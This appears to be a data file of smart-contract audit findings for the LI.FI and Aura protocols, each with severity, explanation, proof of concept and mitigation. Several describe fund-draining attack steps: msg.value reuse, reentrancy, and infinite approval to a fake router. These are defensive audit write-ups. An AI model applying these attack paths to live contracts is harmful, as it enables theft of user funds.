103.md,Anyone can get swaps for free given certain conditions in `swap`.,medium,"[LibSwap.swap](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibSwap.sol#L29-L48)<br>
[GenericSwapFacet.sol](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/GenericSwapFacet.sol)

Remaining or unaccounted ERC20 balance could be freely taken through `swapTokensGenerics` and `swap`.

### Proof of Concept

    function swap(bytes32 transactionId, SwapData calldata _swapData) internal {
            uint256 fromAmount = _swapData.fromAmount;
            uint256 toAmount = LibAsset.getOwnBalance(_swapData.receivingAssetId);
            address fromAssetId = _swapData.sendingAssetId;
            if (!LibAsset.isNativeAsset(fromAssetId) && LibAsset.getOwnBalance(fromAssetId) < fromAmount) {
                LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), fromAmount);
            }

            if (!LibAsset.isNativeAsset(fromAssetId)) {
                LibAsset.approveERC20(IERC20(fromAssetId), _swapData.approveTo, fromAmount);
            }

            // solhint-disable-next-line avoid-low-level-calls
            (bool success, bytes memory res) = _swapData.callTo.call{ value: msg.value }(_swapData.callData);
            if (!success) {
                string memory reason = LibUtil.getRevertMsg(res);
                revert(reason);
            }

            toAmount = LibAsset.getOwnBalance(_swapData.receivingAssetId) - toAmount;

Given:

*   There has been a deposit to LiFi of a non-native ERC20 that makes `LibAsset.getOwnBalance(fromAssetId)` a desirable amount.

*   Attacker calls `swapTokensGeneric` with a `_swapData.fromAmount` value just below `LibAsset.getOwnBalance(fromAssetId)`.

*   First `if` statement in `swap` is skipped (no funds are tranferred to LiFis contract).

<!---->

    if (!LibAsset.isNativeAsset(fromAssetId) && LibAsset.getOwnBalance(fromAssetId) < fromAmount) {
                LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), fromAmount);
            }

*   Swap happens and increases `LibAsset.getOwnBalance(_lifiData.receivingAssetId)`
*   Difference of LiFis balance of the receiving token before and after swap is calculated using `postSwapBalance` and transfered to attacker.

### Recommended Mitigation Steps

Ensure funds are always subtracted from users account in `swap`, even if LiFi has enough balance to do the swap.






***"
103.md,LibSwap: Excess funds from swaps are not returned,medium,"[LibSwap.sol#L29-L58](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibSwap.sol#L29-L58)<br>

It is probable for `_swapData.fromAmount` to be greater than the actual amount used (eg. when swapping for an exact output, or when performing another swap after swapping with an exact input). However, these funds aren’t returned back to the user and are left in the lifi contract.

### Proof of Concept

[AnyswapFacet.test.ts#L153-L194](https://github.com/code-423n4/2022-03-lifinance/blob/main/test/facets/AnyswapFacet.test.ts#L153-L194)<br>

The test referenced above swaps for MATIC for 1000 USDT exactly. Logging the matic amounts before and after the swap and bridge call, one will find 18.01 MATIC is unused and left in the contract when it should be returned to the user.

### Recommended Mitigation Steps

Store the contract’s from balance before and after the swap. Refund any excess back to the user.

```jsx
uint256 actualFromAmount = LibAsset.getOwnBalance(fromAssetId);
(bool success, bytes memory res) = _swapData.callTo.call{ value: msg.value }(_swapData.callData);
if (!success) {
  string memory reason = LibUtil.getRevertMsg(res);
  revert(reason);
}
actualFromAmount -= LibAsset.getOwnBalance(fromAssetId);
require(fromAmount >= actualFromAmount, 'actual amount used more than specified');
// transfer excess back to user
if (actualFromAmount != fromAmount) {
  // transfer excess to user
  // difference calculation be unchecked since fromAmount > actualFromAmount
}
```

This comes with the requirement that the funds for every swap should be pulled from the user.






***"
103.md,`msg.value` is Sent Multipletimes When Performing a Swap,medium,"[LibSwap.sol#L42](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibSwap.sol#L42)<br>
[Swapper.sol#L12-L23](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/Swapper.sol#L12-L23)<br>

`msg.value` is attached multiple times to external swap calls in `LibSwap.swap()`.

If `Swapper._executeSwaps()` is called with the native token as the `swapData.fromAssetId` more than once and `msg.value > 0` then more value will be transferred out of the contract than is received since `msg.value` will be transferred out `_swapData.length` times.

The impact is that the contract can have all the native token balance drained by an attacker who has makes repeated swap calls from the native token into any other ERC20 token. Each time the original `msg.value` of the sender will be swapped out of the contract. This attack essentially gives the attacker `_swapData.length * msg.value` worth of native tokens (swapped into another ERC20) when they should only get `msg.value`.

### Proof of Concept

`Swapper._executeSwaps()` iterates over a list of  `SwapData` calling `LibSwap.swap()` each time (note this is an internal call).

```solidity
    function _executeSwaps(LiFiData memory _lifiData, LibSwap.SwapData[] calldata _swapData) internal {
        // Swap
        for (uint8 i; i < _swapData.length; i++) {
            require(
                ls.dexWhitelist[_swapData[i].approveTo] == true && ls.dexWhitelist[_swapData[i].callTo] == true,
                ""Contract call not allowed!""
            );

            LibSwap.swap(_lifiData.transactionId, _swapData[i]);
        }
    }
}
```

Inside `LibSwap.swap()` we make an external call to `_swapData.callTo` with `value : msg.value`. Due to the loop in `Swapper._executeSwaps()` this repeatedly sends the original `msg.value` in the external call.

```solidity
        (bool success, bytes memory res) = _swapData.callTo.call{ value: msg.value }(_swapData.callData);
```

### Recommended Mitigation Steps

This issue may be mitigated by only allowing `fromAssetId` to be the native token once in `_swapData` in `Swapper._executeSwaps()`. If it occurs more than once the transaction should revert.






***"
103.md,cBridge integration fails to send native tokens,medium,"[CBridgeFacet.sol#L150-L156](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/CBridgeFacet.sol#L150-L156)<br>

The external `sendNative()` call fails to include sending the native tokens together with it.

### Proof of Concept

Add the following test case to the [`CBridgeFacet` test file](https://github.com/code-423n4/2022-03-lifinance/blob/main/test/facets/CBridgeFacet.test.ts).

```jsx
// TODO: update bridge address to 0x5427FEFA711Eff984124bFBB1AB6fbf5E3DA1820
it.only('reverts because ETH not sent to bridge', async () => {
  CBridgeData.token = constants.AddressZero
  CBridgeData.amount = constants.One
  await expect(lifi.connect(alice).startBridgeTokensViaCBridge(lifiData, CBridgeData, {
    value: constants.One,
    gasLimit: 500000
  })).to.be.revertedWith('Amount mismatch');
})
```

### Recommended Mitigation Steps

```jsx
ICBridge(bridge).sendNative{ value: _cBridgeData.amount }(
  _cBridgeData.receiver,
  _cBridgeData.amount,
  _cBridgeData.dstChainId,
  _cBridgeData.nonce,
  _cBridgeData.maxSlippage
);
```

In addition, add the `payable` keyword to the [CBridge interface](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Interfaces/ICBridge.sol#L14-L20).





***"
103.md,DexManagerFacet: batchRemoveDex() removes first dex only,medium,"[DexManagerFacet.sol#L71-L73](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/DexManagerFacet.sol#L71-L73)<br>

The function intends to allow the removal of multiple dexes approved for swaps. However, the function will only remove the first DEX because `return` is used instead of `break` in the inner for loop.

```jsx
if (s.dexs[j] == _dexs[i]) {
  _removeDex(j);
  // should be replaced with break;
  return;
}
```

This error is likely to have gone unnoticed because no event is emitted when a DEX is added or removed.

### Proof of Concept

Add the following lines below [L44 of](https://github.com/code-423n4/2022-03-Li.finance/blob/main/test/facets/AnyswapFacet.test.ts#L44) `[AnyswapFacet.test.ts](https://github.com/code-423n4/2022-03-lifinance/blob/main/test/facets/AnyswapFacet.test.ts#L44)`

```jsx
await dexMgr.addDex(ANYSWAP_ROUTER)
await dexMgr.batchRemoveDex([ANYSWAP_ROUTER, UNISWAP_ADDRESS])
// UNISWAP_ADDRESS remains as approved dex when it should have been removed
console.log(await dexMgr.approvedDexs())
```

### Recommended Mitigation Steps

Replace `return` with `break`.

```jsx
if (s.dexs[j] == _dexs[i]) {
  _removeDex(j);
  break;
}
```

In addition, it is recommend to emit an event whenever a DEX is added or removed.





***"
103.md,ERC20 bridging functions do not revert on non-zero msg.value,medium,"Any native funds mistakenly sent along with plain ERC20 bridging calls will be lost. AnyswapFacet, CBridgeFacet, HopFacet and NXTPFacet have this issue.

For instance, swapping function might use native tokens, but the functions whose purpose is bridging solely have no use of native funds, so any mistakenly sent native funds to be frozen on the contract balance.

Placing the severity to be medium as in combination with other issues there is a possibility for user funds to be frozen for an extended period of time (if WithdrawFacet's issue plays out) or even lost (if LibSwap's swap native tokens one also be triggered).

In other words, the vulnerability is also a wider attack surface enabler as it can bring in the user funds to the contract balance.

Medium despite the fund loss possibility as the native funds in question here are mistakenly sent only, so the probability is lower compared to direct leakage issues.

### Proof of Concept

startBridgeTokensViaAnyswap doesn't check that `msg.value` is zero:

[AnyswapFacet.sol#L38-L48](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/AnyswapFacet.sol#L38-L48)<br>

startBridgeTokensViaCBridge also have no such check:

[CBridgeFacet.sol#L59-L66](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/CBridgeFacet.sol#L59-L66)<br>

startBridgeTokensViaHop the same:

[HopFacet.sol#L66-L71](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/HopFacet.sol#L66-L71)<br>

In NXTPFacet completion function does the check, but startBridgeTokensViaNXTP doesn't:

[NXTPFacet.sol#L54-L59](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/NXTPFacet.sol#L54-L59)<br>

### Recommended Mitigation Steps

Consider reverting when bridging functions with non-native target are called with non-zero native amount added.





***"
103.md,Swap functions are Reenterable,medium,"[DiamondCutFacet.sol#L14-L22](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/DiamondCutFacet.sol#L14-L22)<br>
[CBridgeFacet.sol#L92-L121](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/CBridgeFacet.sol#L92-L121)<br>
[AnyswapFacet.sol#L74-L110](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/AnyswapFacet.sol#L74-L110)<br>
[NXTPFacet.sol#L85-L102](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/NXTPFacet.sol#L85-L102)<br>
[NXTPFacet.sol#L150-L171](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/NXTPFacet.sol#L150-L171)<br>

There is a reenterancy vulnerability in functions which call `Swapper._executeSwap()` which would allow the attacker to change their `postSwapBalance`.

The functions following similar logic to that seen in `GenericSwapFacet.swapTokensGeneric()`.

            uint256 receivingAssetIdBalance = LibAsset.getOwnBalance(_lifiData.receivingAssetId);

            // Swap
            _executeSwaps(_lifiData, _swapData);

            uint256 postSwapBalance = LibAsset.getOwnBalance(_lifiData.receivingAssetId) - receivingAssetIdBalance;

            LibAsset.transferAsset(_lifiData.receivingAssetId, payable(msg.sender), postSwapBalance);

This logic records the balance before and after the `_executeSwaps()` function. The difference is then transferred to the `msg.sender`.

The issue occurs since it is possible for an attacker to reenter this function during `_executeSwaps()`, that is because execute swap makes numerous external calls, such as to the AMM, or to untrusted ERC20 token addresses.

If a function is called such as `WithdrawFacet.withdraw()` this will impact the calculations of `postSwapBalance` which will account for the funds transferred out during withdrawal. Furthermore, any functions which transfers funds into the contract will also be counted in the `postSwapBalance` calculations.

Vulnerable Functions:

*   `GenericSwapFacet.swapTokensGeneric()`
*   `CBridgeFacet.swapAndStartBridgeTokensViaCBridge()`
*   `AnyswapFacet.swapAndStartBridgeTokensViaAnyswap()`
*   `HopFacet.swapAndStartBridgeTokensViaHop()`
*   `NXTPFacet.swapAndStartBridgeTokensViaNXTP()`
*   `NXTPFacet.swapAndCompleteBridgeTokensViaNXTP()`

### Proof of Concept

`GenericSwapFacet.swapTokensGeneric()`

        function swapTokensGeneric(LiFiData memory _lifiData, LibSwap.SwapData[] calldata _swapData) public payable {
            uint256 receivingAssetIdBalance = LibAsset.getOwnBalance(_lifiData.receivingAssetId);

            // Swap
            _executeSwaps(_lifiData, _swapData);

            uint256 postSwapBalance = LibAsset.getOwnBalance(_lifiData.receivingAssetId) - receivingAssetIdBalance;

            LibAsset.transferAsset(_lifiData.receivingAssetId, payable(msg.sender), postSwapBalance);

`CBridgeFacet.swapAndStartBridgeTokensViaCBridge()`

        function swapAndStartBridgeTokensViaCBridge(
            LiFiData memory _lifiData,
            LibSwap.SwapData[] calldata _swapData,
            CBridgeData memory _cBridgeData
        ) public payable {
            if (_cBridgeData.token != address(0)) {
                uint256 _fromTokenBalance = LibAsset.getOwnBalance(_cBridgeData.token);

                // Swap
                _executeSwaps(_lifiData, _swapData);

                uint256 _postSwapBalance = LibAsset.getOwnBalance(_cBridgeData.token) - _fromTokenBalance;

                require(_postSwapBalance > 0, ""ERR_INVALID_AMOUNT"");

                _cBridgeData.amount = _postSwapBalance;
            } else {
                uint256 _fromBalance = address(this).balance;

                // Swap
                _executeSwaps(_lifiData, _swapData);

                uint256 _postSwapBalance = address(this).balance - _fromBalance;

                require(_postSwapBalance > 0, ""ERR_INVALID_AMOUNT"");

                _cBridgeData.amount = _postSwapBalance;
            }

            _startBridge(_cBridgeData);

`AnyswapFacet.swapAndStartBridgeTokensViaAnyswap()`

        function swapAndStartBridgeTokensViaAnyswap(
            LiFiData memory _lifiData,
            LibSwap.SwapData[] calldata _swapData,
            AnyswapData memory _anyswapData
        ) public payable {
            address underlyingToken = IAnyswapToken(_anyswapData.token).underlying();
            if (_anyswapData.token != address(0) && underlyingToken != IAnyswapRouter(_anyswapData.router).wNATIVE()) {
                if (underlyingToken == address(0)) {
                    underlyingToken = _anyswapData.token;
                }

                uint256 _fromTokenBalance = LibAsset.getOwnBalance(underlyingToken);

                // Swap
                _executeSwaps(_lifiData, _swapData);

                uint256 _postSwapBalance = LibAsset.getOwnBalance(underlyingToken) - _fromTokenBalance;

                require(_postSwapBalance > 0, ""ERR_INVALID_AMOUNT"");

                _anyswapData.amount = _postSwapBalance;
            } else {
                uint256 _fromBalance = address(this).balance;

                // Swap
                _executeSwaps(_lifiData, _swapData);

                require(address(this).balance - _fromBalance >= _anyswapData.amount, ""ERR_INVALID_AMOUNT"");

                uint256 _postSwapBalance = address(this).balance - _fromBalance;

                require(_postSwapBalance > 0, ""ERR_INVALID_AMOUNT"");

                _anyswapData.amount = _postSwapBalance;
            }

            _startBridge(_anyswapData);

`HopFacet.swapAndStartBridgeTokensViaHop()`

        function swapAndStartBridgeTokensViaHop(
            LiFiData memory _lifiData,
            LibSwap.SwapData[] calldata _swapData,
            HopData memory _hopData
        ) public payable {
            address sendingAssetId = _bridge(_hopData.asset).token;

            uint256 _sendingAssetIdBalance = LibAsset.getOwnBalance(sendingAssetId);

            // Swap
            _executeSwaps(_lifiData, _swapData);

            uint256 _postSwapBalance = LibAsset.getOwnBalance(sendingAssetId) - _sendingAssetIdBalance;

            require(_postSwapBalance > 0, ""ERR_INVALID_AMOUNT"");

            _hopData.amount = _postSwapBalance;

            _startBridge(_hopData);

`NXTPFacet.swapAndStartBridgeTokensViaNXTP()`

        function swapAndStartBridgeTokensViaNXTP(
            LiFiData memory _lifiData,
            LibSwap.SwapData[] calldata _swapData,
            ITransactionManager.PrepareArgs memory _nxtpData
        ) public payable {
            address sendingAssetId = _nxtpData.invariantData.sendingAssetId;
            uint256 _sendingAssetIdBalance = LibAsset.getOwnBalance(sendingAssetId);

            // Swap
            _executeSwaps(_lifiData, _swapData);

            uint256 _postSwapBalance = LibAsset.getOwnBalance(sendingAssetId) - _sendingAssetIdBalance;

            require(_postSwapBalance > 0, ""ERR_INVALID_AMOUNT"");

            _nxtpData.amount = _postSwapBalance;

            _startBridge(_lifiData.transactionId, _nxtpData);

`NXTPFacet.swapAndCompleteBridgeTokensViaNXTP()`

        function swapAndCompleteBridgeTokensViaNXTP(
            LiFiData memory _lifiData,
            LibSwap.SwapData[] calldata _swapData,
            address finalAssetId,
            address receiver
        ) public payable {
            uint256 startingBalance = LibAsset.getOwnBalance(finalAssetId);

            // Swap
            _executeSwaps(_lifiData, _swapData);

            uint256 postSwapBalance = LibAsset.getOwnBalance(finalAssetId);

            uint256 finalBalance;

            if (postSwapBalance > startingBalance) {
                finalBalance = postSwapBalance - startingBalance;
                LibAsset.transferAsset(finalAssetId, payable(receiver), finalBalance);
            }

            emit LiFiTransferCompleted(_lifiData.transactionId, finalAssetId, receiver, finalBalance, block.timestamp);
        }

### Recommended Mitigation Steps

Consider adding a reentrancy guard over **every** function which may send or receive tokens. It may be easiest too add this guard over the `fallback()` function however that could prevent view functions from being called (since it would perform storage operations).

Ensure the same slot is used to store the reentrancy guard so all required functions are covered by a single guard.






***"
103.md,Should prevent users from sending more native tokens in the `startBridgeTokensViaCBridge` function,medium,"When a user bridges a native token via the `startBridgeTokensViaCBridge` function of `CBridgeFacet`, the contract checks whether `msg.value >= _cBridgeData.amount` holds. In other words, if a user accidentally sends more native tokens than he has to, the contract accepts it but only bridges the `_cBridgeData.amount` amount of tokens. The rest of the tokens are left in the contract and can be recovered by anyone (see another submission for details).

Notice that in the similar functions of other facets (e.g., `AnyswapFacet`, `HopFacet`), the provided native token is ensured to be the exact bridged amount, which effectively prevents the above scenario of loss of funds.

### Proof of Concept

[CBridgeFacet.sol#L68](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/CBridgeFacet.sol#L68)

### Recommended Mitigation Steps

Consider changing `>=` to `==` at line 68.





***"
103.md,Infinite approval to an arbitrary address can be used to steal all the funds from the contract,medium,"[AnyswapFacet.sol#L131-L157](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/AnyswapFacet.sol#L131-L157)<br>

```solidity
function _startBridge(AnyswapData memory _anyswapData) internal {
    // Check chain id
    require(block.chainid != _anyswapData.toChainId, ""Cannot bridge to the same network."");
    address underlyingToken = IAnyswapToken(_anyswapData.token).underlying();

    if (underlyingToken == IAnyswapRouter(_anyswapData.router).wNATIVE()) {
        IAnyswapRouter(_anyswapData.router).anySwapOutNative{ value: _anyswapData.amount }(
            _anyswapData.token,
            _anyswapData.recipient,
            _anyswapData.toChainId
        );
        return;
    }

    if (_anyswapData.token != address(0)) {
        // Has underlying token?
        if (underlyingToken != address(0)) {
            // Give Anyswap approval to bridge tokens
            LibAsset.approveERC20(IERC20(underlyingToken), _anyswapData.router, _anyswapData.amount);

            IAnyswapRouter(_anyswapData.router).anySwapOutUnderlying(
                _anyswapData.token,
                _anyswapData.recipient,
                _anyswapData.amount,
                _anyswapData.toChainId
            );
        } else {
```

[LibAsset.sol#L59-L70](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibAsset.sol#L59-L70)<br>

```solidity
function approveERC20(
    IERC20 assetId,
    address spender,
    uint256 amount
) internal {
    if (isNativeAsset(address(assetId))) return;
    uint256 allowance = assetId.allowance(address(this), spender);
    if (allowance < amount) {
        if (allowance > 0) SafeERC20.safeApprove(IERC20(assetId), spender, 0);
        SafeERC20.safeApprove(IERC20(assetId), spender, MAX_INT);
    }
}
```

In the `AnyswapFacet.sol`, `_anyswapData.router` is from the caller's calldata, which can really be any contract, including a fake Anyswap router contract, as long as it complies to the interfaces used.

And in `_startBridge`, it will grant infinite approval for the `_anyswapData.token` to the `_anyswapData.router`.

This makes it possible for a attacker to steal all the funds from the contract.

Which we explained in [#159](https://github.com/code-423n4/2022-03-lifinance-findings/issues/159), the diamond contract may be holding some funds for various of reasons.

### Proof of Concept

Given:

There are 100 USDC tokens in the contract.

1.  The attacker can submit a `startBridgeTokensViaAnyswap()` with a FAKE `_anyswapData.router`.
2.  Once the FAKE router contract deployed by the attacker got the infinite approval from the diamond contract, the attacker can call `transferFrom()` and take all the funds, including the 100 USDC in the contract anytime.

### Recommended Mitigation Steps

1.  Whitelisting the `_anyswapData.router` rather than trusting user's inputs;
2.  Or, only `approve()` for the amount that required for the current transaction instead of infinite approval.





***"
103.md,Failed transfer with low level call won't revert,medium,"[LibSwap.sol#L42-L46](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibSwap.sol#L42-L46)<br>

`swap` is used throughout the code via `_executeSwaps` in Swapper.sol. According to [Solidity Docs](https://docs.soliditylang.org/en/develop/control-structures.html#error-handling-assert-require-revert-and-exceptions) the call may return true even if it was a failure. This may result in user funds lost because funds were transferred into this contract in preparation for the swap. The swap fails but doesn't revert. There is a way this can happen through GenericSwapFacet.sol due to a missing require that is present in the other facets which is a separate issue but gives this issue more relevance.

### Proof of Concept

1.  Alice uses Generic swap with 100 DAI
2.  Alice's 100 DAI are sent to the Swapper.sol contract
3.  The call on swap `_swapData.callTo.call{ value: msg.value }(_swapData.callData);` fails but returns success due to nonexisting contract
4.  postSwapBalance = 0
5.  Alice receives nothing in return

### Recommended Mitigation Steps

Check for contract existence.

A similar issue was awarded a medium [here](https://github.com/code-423n4/2022-01-trader-joe-findings/issues/170).






***"
103.md,Reputation Risks with `contractOwner`,medium,"[DiamondCutFacet.sol](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/DiamondCutFacet.sol)<br>
[WithdrawFacet.sol](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/WithdrawFacet.sol)<br>
[DexManagerFacet.sol](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/DexManagerFacet.sol)

`contractOwner` has complete freedom to change any functionality and withdraw/rug all assets. Even if well intended the project could still be called out resulting in a damaged reputation [like in this example](https://twitter.com/RugDocIO/status/1411732108029181960).

### Proof of Concept

<https://twitter.com/RugDocIO/status/1411732108029181960>

### Recommended Mitigation Steps

Recommend implementing extra safeguards such as:

*   Limiting the time period where sensitive functions can be used.
*   Having a waiting period before pushed update is executed.
*   Using a multisig to mitigate single point of failure in case `contractOwner` private key leaks.





***"
103.md,"WithdrawFacet's `withdraw` calls native `payable.transfer`, which can be unusable for DiamondStorage owner contract",medium,"When `withdraw` function is used with native token it is being handled with a `payable.transfer()` call.

This is unsafe as `transfer` has hard coded gas budget and can fail when the user is a smart contract. This way any programmatical usage of WithdrawFacet is at risk. Whenever the user either fails to implement the payable fallback function or cumulative gas cost of the function sequence invoked on a native token transfer exceeds 2300 gas consumption limit the native tokens sent end up undelivered and the corresponding user funds return functionality will fail each time.

WithdrawFacet is a core helper contracts that provides basic withdraw functionality to the system, and this way the impact includes principal funds freeze scenario if the described aspect be violated in the DiamondStorage.contractOwner code.

Marking the issue as a medium severity as this is a fund freeze case, but limited to the incorrect contractOwner implementation.

### Proof of Concept

When WithdrawFacet's `withdraw` is called with `_assetAddress` being equal to `NATIVE_ASSET`, the native transfer is handled with `payable.transfer()` mechanics:

[WithdrawFacet.sol#L28-L31](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/WithdrawFacet.sol#L28-L31)<br>

WithdrawFacet is a part of EIP-2535 setup:

[Li.Fi Diamond Helper Contracts](https://github.com/code-423n4/2022-03-lifinance#diamond-helper-contracts)<br>

### References

The issues with `transfer()` are outlined here:

[Stop Using Solidity's transfer() Now](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/)

### Recommended Mitigation Steps

As `withdraw` is runnable by the DiamondStorage.contractOwner only the reentrancy isn't an issue and `transfer()` can be just replaced.

Using low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin's `Address.sendValue` is advised:

[Address.sol#L60](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60)





***"
123.md,User can forfeit other user rewards,high,"[ExtraRewardsDistributor.sol#L127](https://github.com/code-423n4/2022-05-aura/blob/main/contracts/ExtraRewardsDistributor.sol#L127)<br>

User can forfeit other user rewards by giving a higher \_startIndex in getReward function.

### Proof of Concept

1.  Assume User B has not received any reward yet so that his userClaims\[\_token]\[User B]=0
2.  User A calls getReward function with \_account as User B and \_startIndex as 5
3.  This eventually calls \_allClaimableRewards at ExtraRewardsDistributor.sol#L213 which computes epochIndex =5>0?5:0 = 5
4.  Assuming tokenEpochs is 10 and latestEpoch is 8, so reward will computed from epoch 5 till epoch index 7 and \_allClaimableRewards will return index as 7
5.  \_getReward will simply update userClaims\[\_token]\[User B] with 7
6.  This is incorrect because as per contract User B has received reward from epoch 0-7 even though he only received reward for epoch 5-7

### Recommended Mitigation Steps

Do not allow users to call getReward function for other users.



 > [All code4rena fixes code-423n4/2022-05-aura#6](https://github.com/code-423n4/2022-05-aura/pull/6)



***"
123.md,`BaseRewardPool4626` is not IERC4626 compliant,medium,"[BaseRewardPool4626.sol](https://github.com/aurafinance/convex-platform/blob/9cae5eb5a77e73bbc1378ef213740c1889e2e8a3/contracts/contracts/BaseRewardPool4626.sol)<br>

BaseRewardPool4626 is not IERC4626 compliant.<br>
This makes the BaseRewardPool4626 contract irrelevant as it is for now since projects won't be able to integrate with BaseRewardPool4626 using the [eip-4626](https://eips.ethereum.org/EIPS/eip-4626) standard.

### Recommended Mitigation Steps

You can choose to remove the BaseRewardPool4626 and save on some deployment gas or review the necessary`  functions ` and `emits` required on [eip-4626](https://eips.ethereum.org/EIPS/eip-4626)  and add it to BaseRewardPool4626.






***"
123.md,`CrvDepositorWrapper.sol` relies on oracle that isn't frequently updated,medium,"[CrvDepositorWrapper.sol#L56-L65](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/CrvDepositorWrapper.sol#L56-L65)<br>

Unpredictable slippage, sandwich vulnerability or frequent failed transactions

### Proof of Concept

CrvDepostiorWrapper uses the TWAP provided by the 20/80 WETH/BAL. The issue is that this pool has only handled \~15 transactions per day in the last 30 days, which means that the oracle frequently goes more than an hour without updating. Each time a state changing operation is called, the following code in the balancer pool takes a snapshot of the pool state BEFORE any operation changes it:

[OracleWeightedPool.sol#L156-L161](https://github.com/balancer-labs/balancer-v2-monorepo/blob/80e1a5db7439069e2cb53e228bce0a8a51f5b23e/pkg/pool-weighted/contracts/oracle/OracleWeightedPool.sol#L156-L161)<br>

This could result in the price of the oracle frequently not reflecting the true value of the assets due to infrequency of update. Now also consider that the pool has a trading fee of 2%. Combine an inaccurate oracle with a high fee pool and trades can exhibit high levels of ""slippage"". To account for this outputBps in AuraStakingProxy needs to be set relatively low or risks frequent failed transactions when calling distribute due to slippage conditions not being met. The lower outputBps is set the more vulnerable distribute becomes to sandwich attacks.

### Recommended Mitigation Steps

Consider using chainlink oracles for both BAL and ETH to a realtime estimate of the LP value. A chainlink LP oracle implementation can be found [here](https://blog.alphaventuredao.io/fair-lp-token-pricing/).





***"
123.md,Improperly Skewed Governance Mechanism,medium,"[AuraLocker.sol#L594-L609](https://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L594-L609)<br>
[AuraLocker.sol#L611-L618](https://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L611-L618)<br>

| File           | Lines                                                                                                                                                                                                      | Type                      |
| :------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :------------------------ |
| AuraLocker.sol | [L594-L609](https://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L594-L609), [L611-L618](https://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L611-L618) | Governance Susceptibility |

### Description

The balance checkpointing system exposed by the contract for governance purposes is flawed as it does not maintain voting balances properly. In detail, the total supply of votes is tracked as the sum of all locked balances, however, the total voting power of an individual only tracks delegated balances. As a result, governance percentage thresholds will be significantly affected and potentially unmet.

### Impact

The governance module may be unusable due to the significant discrepancy between ""circulating"" voting power supply and the actual voting power of each individual summed up.

### Solution (Recommended Mitigation Steps)

We advise the total voting supply to properly track the delegated balances only as otherwise, any system relying on proportionate checkpointed balances will fail to function properly.

### Proof of Concept

Issue is deducible by inspecting the relevant lines referenced in the issue and making note of the calculations within the `getPastVotes` individual voting power function as well as the `getPastTotalSupply` cumulative voting power function.





***"
123.md,"`AuraLocker` kick reward only takes last locked amount into consideration, instead of whole balance",medium,"The issue occurs in AuraLocker, when expired locks are processed via kicking, and if all the user locks have expired.<br>
In this scenario, to calculate the kick reward, `_processExpiredLocks` multiplies the last locked amount by the number of epochs between the last lock's unlock time and the current epoch.<br>
A comment in this section mentions `""wont have the exact reward rate that you would get if looped through""`. However, there's no reason not to multiply *user's whole locked balance* by the number of epochs since the *last lock's* unlock time, *instead of only the last locked amount*.<br>
While this will still not be as accurate as looping through, this will give a more accurate kick reward result, which is still bounded by the full amount that would have been calculated if we had looped through.

### Impact

The reward calculation is inaccurate and lacking for no reason.<br>
Kickers receive less rewards than they should.<br>
Giving them a bigger, more accurate reward, will incentivize them better.

### Proof of Concept

[This](https://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L396:#L405) is the section that calculates the kick reward if all locks have expired:

                //check for kick reward
                //this wont have the exact reward rate that you would get if looped through
                //but this section is supposed to be for quick and easy low gas processing of all locks
                //we'll assume that if the reward was good enough someone would have processed at an earlier epoch
                if (_checkDelay > 0) {
                    uint256 currentEpoch = block.timestamp.sub(_checkDelay).div(rewardsDuration).mul(rewardsDuration);
                    uint256 epochsover = currentEpoch.sub(uint256(locks[length - 1].unlockTime)).div(rewardsDuration);
                    uint256 rRate = AuraMath.min(kickRewardPerEpoch.mul(epochsover + 1), denominator);
                    reward = uint256(locks[length - 1].amount).mul(rRate).div(denominator);
                }

This flow is for low gas processing, so the function is not looping through all the locks (unlike the flow where some locks have not expired yet).<br>
In this flow, the function is just calculating the reward for the last lock.

Instead of doing this, it can multiply the *total amount locked by the user* (`locked`, already saved) by the *number of epochs between the last unlock time and current epoch*.<br>
The reward will still be smaller than if we had looped through all the rewards (since then each lock amount would be multiplied by more than just the last lock's number of expired epochs).<br>
But it would be more accurate and give better incentive for kicking.

### Recommended Mitigation Steps

Change the last line in the code above to:

                    reward = uint256(locked).mul(rRate).div(denominator);

